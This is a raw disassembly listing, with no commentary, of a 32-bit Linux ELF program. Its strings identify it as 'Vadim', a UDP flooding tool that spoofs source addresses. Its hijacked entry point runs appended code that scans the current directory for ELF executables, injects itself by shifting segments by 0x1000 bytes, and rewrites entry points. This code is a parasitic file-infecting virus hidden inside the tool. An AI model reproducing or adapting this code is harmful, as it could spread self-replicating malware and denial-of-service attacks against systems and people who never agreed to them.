jmp 0x8048a6f
dec edi
push ebx
inc esi
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
and byte [eax], ah
mov eax, loc._start
pushal
call fcn.0804993a
popal
jmp eax
push ebp
mov ebp, esp
cmp dword [obj.completed.3], 0
jne 0x8048600
jmp 0x80485d9
mov esi, esi
lea edx, [eax + 4]
mov dword [obj.p.2], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.2]
cmp dword [eax], 0
jne 0x80485cc
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x80485f6
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.3], 1
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x8048627
push obj.object.8
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x8048828
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x804881c
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov eax, dword [arg_ch]
mov word [var_2h], ax
call loc.gcc2_compiled._3
mov eax, dword [obj.spoof]
push eax
movsx eax, word [var_2h]
push eax
mov eax, dword [arg_8h]
push eax
push str.Slashing_your_angry_Vadims_at__s__port__d_spoofed_as__s_n
call sym.imp.printf
add esp, 0x10
mov eax, dword [arg_8h]
push eax
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [var_18h], eax
cmp dword [var_18h], 0
jne 0x80486c8
mov eax, dword [arg_8h]
push eax
push str.Unknown_host:__s_n
call sym.imp.printf
add esp, 8
push 0
call sym.imp.exit
add esp, 4
push 0x10
lea eax, [addr]
push eax
call sym.imp.bzero
add esp, 8
mov eax, dword [var_18h]
mov edx, dword [eax + 0xc]
push edx
lea eax, [addr]
lea edx, [eax + 4]
push edx
mov eax, dword [var_18h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
call sym.imp.bcopy
add esp, 0xc
mov eax, dword [var_18h]
mov dx, word [eax + 8]
mov word [addr], dx
movzx eax, word [var_2h]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_12h], ax
push 0
push 2
push 2
call sym.imp.socket
add esp, 0xc
mov eax, eax
mov dword [socket], eax
push 0x10
lea edx, [addr]
mov eax, edx
push eax
mov eax, dword [socket]
push eax
call sym.imp.connect
add esp, 0xc
mov edx, dword [socket]
mov eax, edx
jmp 0x8048744
lea esi, [esi]
leave
ret
push ebp
mov ebp, esp
push str._nVadim_v.Ibeta_by_Luciffer_n
call sym.imp.printf
add esp, 4
push str.Anybody
push str.Registered_to:__s_n
call sym.imp.printf
add esp, 8
push str._________________________________n
call sym.imp.printf
add esp, 4
leave
ret
jmp dword [reloc.printf]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.exit]
jmp dword [reloc.bzero]
jmp dword [reloc.bcopy]
jmp dword [reloc.htons]
jmp dword [reloc.socket]
jmp dword [reloc.connect]
push ebp
mov ebp, esp
push ebx
call 0x8048471
pop ebx
add ebx, 0x15ff
cmp dword [ebx + 0x48], 0
je 0x8048486
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 4
cmp dword [argv], 4
je 0x80487a0
call loc.gcc2_compiled._3
mov eax, dword [envp]
mov edx, dword [eax]
push edx
push str.Syntax:__s__host___port___spoof__n
call sym.imp.printf
add esp, 8
push str._host_____:_either_hostname_or_IP_address._n
call sym.imp.printf
add esp, 4
push str._port_____:_any_open_UDP_port_number._n
call sym.imp.printf
add esp, 4
push str._spoof____:_any_real__unused_ip._n_n
call sym.imp.printf
add esp, 4
push 0
call sym.imp.exit
add esp, 4
lea esi, [esi]
call sym.imp.getuid
mov eax, eax
push eax
call sym.imp.setuid
add esp, 4
mov eax, dword [envp]
add eax, 0xc
mov edx, dword [eax]
mov dword [obj.spoof], edx
mov eax, dword [envp]
add eax, 8
mov edx, dword [eax]
push edx
call sym.imp.atoi
add esp, 4
mov eax, eax
movsx edx, ax
push edx
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
call sym.echo_connect
add esp, 8
mov eax, eax
mov dword [socket], eax
nop
push 0
push 0xa
push str.0123456789
mov eax, dword [socket]
push eax
call sym.imp.send
add esp, 0x10
jmp 0x80487ec
jmp dword [reloc.getuid]
jmp dword [reloc.setuid]
jmp dword [reloc.atoi]
jmp dword [reloc.send]
push ebp
mov ebp, esp
push ebx
call 0x8048841
pop ebx
add ebx, 0x122f
call loc.gcc2_compiled.
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
call fcn.08049822
test eax, eax
je 0x80499c9
lea eax, [var_1004h]
push eax
call fcn.080496ca
mov edi, eax
add esp, 4
test edi, edi
je 0x80499c9
call edi
test eax, eax
jne 0x80499c9
push dword [var_1004h]
push edi
call fcn.0804988e
push 0x18
call fcn.08048aaa
add esp, 0xc
test eax, eax
jne 0x80499c9
push 0x1000
lea esi, [var_1000h]
push esi
push 0xb7
call fcn.08048aca
push 8
lea ebx, [var_100ch]
push ebx
push 3
call fcn.08048d5e
push ebx
push 0xc
call fcn.08048ab6
add esp, 0x20
push dword [var_1004h]
push edi
call fcn.0804988e
push esi
push 0xc
call fcn.08048ab6
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x80
push esi
push ebx
push 0x80
lea esi, [var_80h]
push esi
push 2
call fcn.08048d5e
push 0
push 0
push esi
push 5
call fcn.08048ae2
mov ebx, eax
add esp, 0x1c
test ebx, ebx
jl 0x8049863
push 0x80
push esi
push ebx
push 3
call fcn.08048ae2
add esp, 0x10
push ebx
push 6
call fcn.08048ab6
push esi
call fcn.08048cbe
cmp eax, 0x12b
jg 0x804987e
xor eax, eax
jmp 0x8049883
mov esi, esi
mov eax, 1
lea esp, [var_88h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x47c
push edi
push esi
push ebx
mov dword [var_478h], 0
lea esi, [var_400h]
push 0x400
push esi
push 0
call fcn.08048d5e
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [esi + ecx - 1]
push 0x14
call fcn.08048aaa
mov edx, eax
push edx
call fcn.08048c7e
mov edx, eax
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ecx, [esi + ecx - 1]
add edx, ecx
push 5
push edx
push 1
call fcn.08048d5e
add esp, 0x20
push ebx
push 0x14
call fcn.08048aaa
add esp, 4
mov edx, eax
push edx
call fcn.08049676
push 0
push 0
push esi
push 5
call fcn.08048ae2
mov ebx, eax
add esp, 0x18
test ebx, ebx
jl 0x80497ee
push 0x34
lea eax, [var_474h]
push eax
push ebx
call fcn.08048b36
add esp, 0xc
cmp eax, 1
jne 0x80497ee
push 0
push dword [var_468h]
push ebx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x80497ee
lea eax, [var_440h]
push eax
push ebx
push 0x6c
call fcn.08048aca
add esp, 0xc
test eax, eax
jl 0x80497ee
mov eax, dword [var_468h]
mov edi, dword [var_42ch]
sub edi, eax
push edi
call fcn.08048b02
mov dword [var_478h], eax
add esp, 4
test eax, eax
je 0x80497ee
push edi
push eax
push ebx
call fcn.08048b36
mov edx, eax
add esp, 0xc
cmp edx, 1
jne 0x80497ee
mov eax, dword [arg_8h]
mov dword [eax], edi
push ebx
push 6
call fcn.08048ab6
mov eax, dword [var_478h]
jmp 0x8049817
nop
cmp ebx, 0xffffffff
je 0x80497fe
push ebx
push 6
call fcn.08048ab6
add esp, 8
cmp dword [var_478h], 0
je 0x8049815
mov eax, dword [var_478h]
push eax
push 0x2d
call fcn.08048ab6
xor eax, eax
lea esp, [var_488h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
sub esp, 0x130
push edi
push esi
push ebx
lea edx, [var_12ch]
mov dword [var_130h], edx
lea ebx, [var_122h]
mov esi, 0xc8
mov byte [var_12ch], 0x2e
mov byte [var_12bh], 0
push 0
push 0
push edx
push 5
call fcn.08048ae2
mov edi, eax
add esp, 0x10
test edi, edi
jge 0x804990f
mov eax, 0xffffffff
jmp 0x804992f
lea esi, [esi]
test esi, esi
jl 0x8049927
push ebx
call fcn.08048c3e
add eax, ebx
add esp, 4
cmp byte [eax - 2], 0x70
jne 0x80498f9
cmp byte [eax - 1], 0x73
je 0x804990f
mov edx, dword [arg_ch]
push edx
mov edx, dword [arg_8h]
push edx
push ebx
call fcn.08048f8e
add esp, 0xc
test eax, eax
jne 0x804990f
dec esi
push 1
mov edx, dword [var_130h]
push edx
push edi
push 0x59
call fcn.08048ae2
add esp, 0x10
test eax, eax
jg 0x80498de
push edi
push 6
call fcn.08048ab6
lea esp, [var_13ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
int 0x80
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
mov eax, dword [arg_10h]
mov ebx, dword [arg_14h]
mov ecx, dword [arg_18h]
int 0x80
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.08048d2e
mov esi, eax
test ebx, ebx
jle 0x8048d81
nop
cmp byte [esi], 0
jne 0x8048d7c
dec ebx
inc esi
test ebx, ebx
jg 0x8048d76
mov eax, dword [arg_10h]
push eax
push 0
mov edi, dword [arg_ch]
push edi
call fcn.08048c1a
mov edx, esi
mov edi, edx
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
mov eax, dword [arg_10h]
cmp ecx, eax
ja 0x8048dbe
mov edi, esi
xor eax, eax
cld
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
lea ebx, [ecx - 1]
jmp 0x8048dc1
lea esi, [esi]
mov ebx, dword [arg_10h]
xor ecx, ecx
cmp ecx, ebx
jge 0x8048def
lea esi, [esi]
mov dl, byte [ecx + esi]
test dl, dl
je 0x8048dea
mov byte [var_4h], dl
and byte [var_4h], 0xf0
sub dl, byte [var_4h]
add byte [var_4h], 0xf
mov al, byte [var_4h]
sub al, dl
mov edi, dword [arg_ch]
mov byte [ecx + edi], al
inc ecx
cmp ecx, ebx
jl 0x8048dca
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
int 0x80
pop ebx
leave
ret
pop eax
sub eax, 0x4e
jmp 0x8048a9c
call fcn.08048a8f
leave
ret
push ebp
mov ebp, esp
push ebx
push ecx
push edx
mov eax, dword [arg_14h]
mov ebx, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_20h]
int 0x80
pop edx
pop ecx
pop ebx
leave
ret
pop eax
jmp loc.08048d59
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
call fcn.08048d2e
mov esi, eax
test ebx, ebx
jle 0x8048d81
nop
cmp byte [esi], 0
jne 0x8048d7c
dec ebx
inc esi
test ebx, ebx
jg 0x8048d76
mov eax, dword [arg_10h]
push eax
push ebp
mov ebp, esp
jmp 0x8048d36
pop eax
jmp loc.08048d59
call fcn.08048d33
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [eax], al
and byte [edx + 0x77], ch
push 0
and byte [edi + 0x7d], bh
pushal
insb byte es:[edi], dx
and byte [edx + 0x7f], bh
jnp 0x8048db7
bound ebp, qword [edx]
and byte [arg_66h], ch
popal
add cl, cl
leave
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [arg_10h]
mov cl, byte [arg_ch]
xor eax, eax
cmp eax, edx
jge 0x8048c36
nop
mov byte [eax + ebx], cl
inc eax
cmp eax, edx
jl 0x8048c2e
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_ch]
push dword [arg_10h]
push ebx
push dword [arg_8h]
push 0x13
call fcn.08048ae2
cmp eax, ebx
jne 0x8048bde
mov eax, 1
jmp 0x8048be0
xor eax, eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 3
call fcn.08048ae2
add esp, 0x10
cmp eax, ebx
jne 0x8048b5e
mov eax, 1
jmp 0x8048b72
test eax, eax
jg 0x8048b6a
test ebx, ebx
jle 0x8048b6a
xor eax, eax
jmp 0x8048b72
sub ebx, eax
add byte [esi], al
jmp 0x8048b46
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
cmp byte [edx], 0x7f
jne 0x8048f8a
cmp byte [edx + 1], 0x45
jne 0x8048f8a
cmp byte [edx + 2], 0x4c
jne 0x8048f8a
cmp byte [edx + 3], 0x46
jne 0x8048f8a
cmp word [edx + 0x10], 2
jne 0x8048f8a
mov ax, word [edx + 0x12]
cmp ax, 3
je 0x8048f76
cmp ax, 6
jne 0x8048f8a
cmp dword [edx + 0x14], 1
jne 0x8048f8a
cmp word [edx + 0xa], 1
ja 0x8048f8a
mov eax, 1
jmp 0x8048f8c
xor eax, eax
leave
ret
push ebp
mov ebp, esp
sub esp, 0x100c
push edi
push esi
push ebx
mov eax, dword [arg_40h]
xor ebx, ebx
movzx edx, word [arg_38h]
cmp ebx, edx
jge 0x8048e35
lea esi, [esi]
cmp dword [eax + 4], 0
jne 0x8048e26
cmp dword [eax], 1
jne 0x8048e2d
mov esi, eax
jmp 0x8048e2d
nop
cmp dword [eax], 1
jne 0x8048e2d
mov ecx, eax
add eax, 0x20
inc ebx
cmp ebx, edx
jl 0x8048e16
mov edx, dword [esi + 8]
mov eax, edx
add eax, dword [esi + 0x10]
mov ecx, dword [ecx + 8]
sub ecx, eax
mov eax, ecx
cmp eax, 0xfff
jle 0x8048e56
mov eax, 3
jmp 0x8048f34
nop
mov eax, dword [arg_24h]
mov ecx, eax
sub ecx, edx
add ecx, dword [esi + 4]
add edx, dword [esi + 0x14]
sub edx, eax
lea eax, [edx - 1]
cmp eax, 0xfff
jbe 0x8048e7a
mov eax, 2
jmp 0x8048f34
nop
cmp edx, 0x1000
ja 0x8048e86
mov esi, edx
jmp 0x8048e8b
mov esi, 0x1000
push 0
push ecx
mov edi, dword [arg_8h]
push edi
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8048f23
push esi
lea edi, [var_1000h]
mov dword [var_100ch], edi
push edi
mov edi, dword [arg_8h]
push edi
call fcn.08048b36
cmp eax, 1
jne 0x8048f23
xor ebx, ebx
lea eax, [esi - 4]
cmp ebx, eax
jge 0x8048f23
mov edi, dword [var_100ch]
mov dword [var_1008h], edi
mov dword [var_1004h], eax
nop
mov edi, dword [var_100ch]
mov esi, dword [edi]
mov edi, dword [var_1008h]
cmp byte [edi + ebx + 3], 0
je 0x8048f14
xor ecx, ecx
movzx edx, word [arg_3ch]
cmp ecx, edx
jge 0x8048f14
mov eax, edx
mov edx, dword [arg_44h]
add edx, 4
nop
cmp esi, dword [edx + 8]
jne 0x8048f0c
cmp dword [edx], 1
je 0x8048f2a
add edx, 0x28
inc ecx
cmp ecx, eax
jl 0x8048f02
inc dword [var_100ch]
inc ebx
cmp ebx, dword [var_1004h]
jl 0x8048eda
mov eax, 0xffffffff
jmp 0x8048f34
mov eax, dword [arg_48h]
mov dword [eax], esi
mov eax, 1
lea esp, [var_1018h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
nop
push ebx
push esi
push edi
push 4
call fcn.08048ae2
add esp, 0x10
cmp eax, ebx
jne 0x8048ba2
mov eax, 1
jmp 0x8048bb6
test eax, eax
jg 0x8048bae
test ebx, ebx
jle 0x8048bae
xor eax, eax
jmp 0x8048bb6
sub ebx, eax
add byte [esi], al
jmp 0x8048b8a
mov esi, esi
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, 0xf86
leave
ret
push ebp
mov ebp, esp
jmp 0x8048a97
pop eax
sub eax, 0x4e
jmp 0x8048a9c
call fcn.08048a8f
push ebp
mov ebp, esp
mov eax, 0x21
inc eax
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push esi
push ebx
mov esi, dword [arg_8h]
xor ecx, ecx
test esi, esi
jg 0x8048c96
mov eax, 1
jmp 0x8048cb7
mov ebx, 0x66666667
lea esi, [esi]
mov eax, esi
imul ebx
sar edx, 2
sar esi, 0x1f
mov dword [var_4h], esi
mov esi, edx
sub esi, dword [var_4h]
inc ecx
test esi, esi
jg 0x8048c9e
mov eax, ecx
lea esp, [var_ch]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 4
push edi
push esi
push ebx
mov ebx, dword [arg_8h]
mov edi, dword [arg_ch]
push ebx
call fcn.08048c7e
lea ecx, [eax - 1]
test ecx, ecx
jl 0x80496c2
mov esi, 0x66666667
lea esi, [esi]
mov eax, ebx
imul esi
sar edx, 2
mov dword [var_4h], ebx
sar dword [var_4h], 0x1f
sub edx, dword [var_4h]
lea eax, [edx + edx*4]
add eax, eax
sub ebx, eax
mov dword [var_4h], ebx
mov ebx, edx
mov al, byte [var_4h]
add al, 0x30
mov byte [ecx + edi], al
dec ecx
jns 0x804969a
lea esp, [var_10h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov ebx, dword [arg_8h]
push 0
push 0x2d
call fcn.08048ab6
mov esi, eax
add ebx, esi
push ebx
push 0x2d
call fcn.08048ab6
cmp eax, esi
je 0x8048b2a
mov eax, esi
jmp 0x8048b2c
lea esi, [esi]
xor eax, eax
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
sub esp, 8
push edi
push esi
push ebx
xor esi, esi
mov dword [var_8h], 0
mov edi, dword [arg_8h]
mov al, byte [edi]
jmp 0x8048ce1
lea esi, [esi]
inc esi
mov edi, dword [arg_8h]
mov al, byte [esi + edi]
add al, 0xd0
cmp al, 9
jbe 0x8048cda
xor ebx, ebx
cmp ebx, esi
jge 0x8048d20
lea edi, [esi - 1]
mov dword [var_4h], edi
lea esi, [esi]
mov edi, dword [arg_8h]
movsx eax, byte [ebx + edi]
add eax, 0xffffffd0
xor ecx, ecx
mov edx, dword [var_4h]
sub edx, ebx
cmp ecx, edx
jge 0x8048d18
lea esi, [esi]
lea eax, [eax + eax*4]
add eax, eax
inc ecx
cmp ecx, edx
jl 0x8048d0e
add dword [var_8h], eax
inc ebx
cmp ebx, esi
jl 0x8048cf6
mov eax, dword [var_8h]
lea esp, [var_14h]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
xor eax, eax
cmp byte [edx], 0
je 0x8048c55
lea esi, [esi]
inc edx
inc eax
cmp byte [edx], 0
jne 0x8048c4e
leave
ret
push ebp
mov ebp, esp
sub esp, 0xf8
push edi
push esi
push ebx
lea eax, [var_b4h]
push eax
mov ecx, dword [arg_8h]
push ecx
push 0x6a
call fcn.08048aca
add esp, 0xc
test eax, eax
jl 0x8049663
mov eax, dword [var_94h]
mov dword [var_bch], eax
mov eax, dword [var_8ch]
lea ecx, [var_bch]
mov dword [var_ech], ecx
mov dword [ecx + 4], eax
push 0
push 2
mov ecx, dword [arg_8h]
push ecx
push 5
call fcn.08048ae2
mov dword [var_c4h], eax
add esp, 0x10
test eax, eax
jl 0x804964c
push 0x34
lea ecx, [var_74h]
mov dword [var_f4h], ecx
mov dword [var_c8h], ecx
push ecx
mov ecx, dword [var_c4h]
push ecx
call fcn.08048b36
add esp, 0xc
test eax, eax
je 0x804964c
mov ecx, dword [var_f4h]
push ecx
call fcn.08048f42
add esp, 4
test eax, eax
je 0x804964c
mov dword [var_cch], esp
movzx edi, word [var_48h]
movzx eax, word [var_44h]
mov dword [var_d0h], edi
shl dword [var_d0h], 5
sub esp, dword [var_d0h]
mov dword [var_d4h], esp
xor ebx, ebx
mov dword [var_d8h], 0
lea eax, [eax + eax*4]
shl eax, 3
mov dword [var_e4h], eax
sub esp, eax
mov dword [var_e8h], esp
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b36
add esp, 0xc
test eax, eax
je 0x8049646
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b36
add esp, 0xc
test eax, eax
je 0x8049646
mov dword [var_f8h], 0
cmp ebx, edi
jge 0x8049151
mov esi, dword [var_d4h]
add esi, 4
mov eax, dword [var_d4h]
xor edx, edx
mov esi, esi
cmp dword [esi + edx], 0
jne 0x8049132
cmp dword [eax], 1
jne 0x804913d
mov ebx, eax
jmp 0x804913d
nop
cmp dword [eax], 1
jne 0x804913d
mov dword [var_d8h], eax
add eax, 0x20
add edx, 0x20
inc dword [var_f8h]
cmp dword [var_f8h], edi
jl 0x8049122
test ebx, ebx
je 0x8049646
cmp dword [var_d8h], 0
je 0x8049646
mov ecx, dword [ebx + 0x10]
mov dword [var_dch], ecx
mov ecx, dword [ebx + 4]
add dword [var_dch], ecx
mov ecx, dword [ebx + 0x14]
mov dword [var_e0h], ecx
mov ecx, dword [ebx + 8]
add dword [var_e0h], ecx
lea ecx, [var_c0h]
mov dword [var_f0h], ecx
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_d4h]
push ecx
add esp, 0xffffffcc
mov edi, esp
mov esi, dword [var_c8h_2]
cld
mov ecx, 0xd
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048dfa
add esp, 0x44
cmp eax, 1
je 0x80494a6
jle 0x8049646
cmp eax, 2
je 0x8049502
cmp eax, 3
jne 0x8049646
mov dword [var_f8h], 0
cmp word [var_48h], 0
je 0x8049261
mov ebx, dword [var_d4h]
add ebx, 0x14
mov esi, dword [var_d4h]
add esi, 0x10
mov edx, dword [var_d4h]
add edx, 4
xor edi, edi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jb 0x8049227
add eax, 0x1000
mov dword [edx], eax
test eax, eax
jne 0x8049243
mov ecx, dword [var_d4h]
cmp dword [ecx + edi], 1
jne 0x8049243
add dword [esi], 0x1000
add dword [ebx], 0x1000
add ebx, 0x20
add esi, 0x20
add edx, 0x20
add edi, 0x20
inc dword [var_f8h]
movzx eax, word [var_48h]
cmp dword [var_f8h], eax
jl 0x8049216
mov dword [var_f8h], 0
movzx esi, word [var_44h]
cmp dword [var_f8h], esi
jge 0x80492a8
mov edx, dword [var_e8h]
add edx, 0x10
mov esi, esi
mov eax, dword [edx]
cmp eax, dword [var_dch]
jbe 0x8049297
add eax, 0x1000
mov dword [edx], eax
movzx esi, word [var_44h]
add edx, 0x28
inc dword [var_f8h]
cmp dword [var_f8h], esi
jl 0x8049282
push 0
push dword [var_58h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
mov ecx, dword [var_d0h]
push ecx
mov ecx, dword [var_d4h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
push 0
push dword [var_54h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
mov ecx, dword [var_e4h]
push ecx
mov ecx, dword [var_e8h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
mov edi, esp
mov ebx, dword [var_a0h]
sub ebx, dword [var_dch]
mov eax, ebx
and eax, 0x1fffffff
add eax, 3
and eax, 0x3ffffffc
sub esp, eax
mov esi, esp
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b36
add esp, 0xc
cmp eax, 1
jne 0x8049646
push 0
mov eax, dword [var_dch]
add eax, 0x1000
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push ebx
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
cmp eax, 1
jne 0x8049646
mov esp, edi
push 0
mov ecx, dword [var_dch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
call fcn.08048a9e
push eax
call fcn.08048a8a
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
push 0
call fcn.08048a7e
add eax, dword [var_dch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push 4
lea eax, [var_5ch]
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
mov word [var_6ah], 2
mov ecx, dword [var_a0h]
add ecx, 0x1000
mov dword [var_68h], ecx
mov ecx, dword [var_e0h]
mov dword [var_5ch], ecx
mov eax, dword [var_54h]
cmp eax, dword [var_dch]
jb 0x804947d
add eax, 0x1000
mov dword [var_54h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push 0x34
mov ecx, dword [var_f4h_2]
jmp 0x80495d4
nop
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
cmp word [var_6ah], 1
ja 0x8049641
mov eax, dword [ebx + 0x14]
add eax, dword [ebx + 8]
add eax, 0xfffff000
mov dword [var_5ch], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push 0x34
mov ecx, dword [var_c8h_2]
jmp 0x8049558
lea esi, [esi]
mov eax, dword [ebx + 0x10]
add eax, dword [ebx + 4]
lea esi, [eax - 0x1000]
mov edx, dword [ebx + 0x14]
add edx, dword [ebx + 8]
mov eax, dword [var_5ch]
mov dword [var_c0h], eax
mov word [var_6ah], 2
mov eax, dword [var_a0h]
mov dword [var_68h], eax
add edx, 0xfffff000
mov dword [var_5ch], edx
push 0
push 0
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push 0x34
mov ecx, dword [var_f4h_2]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
push 0
push esi
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
call fcn.08048a9e
push eax
call fcn.08048a8a
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
push 0
call fcn.08048a7e
add eax, esi
push eax
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
push 4
mov ecx, dword [var_f0h]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
push 0
push dword [var_68h]
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048bbe
add esp, 0xc
test eax, eax
je 0x8049646
mov ecx, dword [var_f4h]
push ecx
mov ecx, dword [var_ch]
push ecx
mov ecx, dword [var_c4h_2]
push ecx
call fcn.08048b7a
add esp, 0xc
cmp eax, 1
jne 0x8049646
mov ecx, dword [var_c4h_2]
push ecx
push 6
call fcn.08048ab6
mov ecx, dword [var_ech_2]
push ecx
mov ecx, dword [var_8h]
push ecx
push 0x1e
call fcn.08048aca
test eax, eax
jl 0x8049646
xor eax, eax
jmp 0x8049668
nop
mov esp, dword [var_cch_2]
cmp dword [var_c4h], 0xffffffff
je 0x8049663
mov ecx, dword [var_c4h]
push ecx
push 6
call fcn.08048ab6
mov eax, 0xffffffff
lea esp, [var_104h]
